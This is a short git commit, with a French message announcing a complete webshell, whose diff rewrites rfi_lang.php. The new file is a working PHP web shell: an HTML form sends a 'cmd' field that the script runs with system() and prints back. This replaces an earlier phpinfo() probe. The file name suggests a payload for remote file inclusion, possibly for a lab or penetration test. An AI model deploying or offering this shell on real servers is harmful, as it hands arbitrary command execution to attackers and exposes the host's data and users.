06d8219ea3a6aa55ea1c6782c8adc404afd88999
Vivien Chambe <vivien.chambe@live.com>
2025-06-23 17:10:40 +0200

    websehll complet

--- rfi_lang.php
+++ rfi_lang.php
@@ -1,2 +1,14 @@
+<?php
+// Interface HTML simple + exécution de commande
+if (isset($_POST['cmd'])) {
+    echo "<pre>";
+    system($_POST['cmd']);
+    echo "</pre>";
+}
+?>
 
-<?php phpinfo(); ?>
+<form method="POST">
+    <input type="text" name="cmd" placeholder="Commande..." style="width:300px;" />
+    <input type="submit" value="Exécuter" />
+</form>
+
